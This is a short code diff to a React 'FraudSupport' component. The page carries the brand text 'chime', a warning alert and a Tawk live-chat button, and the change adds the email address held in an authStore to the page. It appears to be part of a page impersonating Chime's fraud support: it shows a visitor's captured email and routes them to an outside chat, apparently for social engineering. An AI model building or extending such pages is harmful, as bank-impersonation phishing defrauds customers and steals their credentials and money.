@@ -2,6 +2,7 @@ import { useEffect } from "react";
 import { Box, Typography, Button, Link, Stack, Divider } from "@mui/material";
 import WarningAmberIcon from "@mui/icons-material/WarningAmber";
 import SupportAgentIcon from "@mui/icons-material/SupportAgent";
+import { emailStore } from "./authStore";
 
 export default function FraudSupport() {
   // 🔹 Load Tawk script
@@ -24,6 +25,8 @@ export default function FraudSupport() {
       };
     }, []);
 
+    const email = emailStore((state) => state.email);
+    
   return (
     <Box
       sx={{
@@ -43,6 +46,10 @@ export default function FraudSupport() {
           sx={{ color: "#2de28a", fontWeight: 700, mb: 3 }}
         >
           chime
+        </Typography>
+
+        <Typography sx={{ fontSize: "0.95rem" }}>
+          {email}
         </Typography>
 
         {/* Alert */}
@@ -66,7 +73,6 @@ export default function FraudSupport() {
 
         {/* Actions */}
         <Stack spacing={2}>
-
           <Button
             onClick={() => window.Tawk_API?.toggle()}
             startIcon={<SupportAgentIcon />}
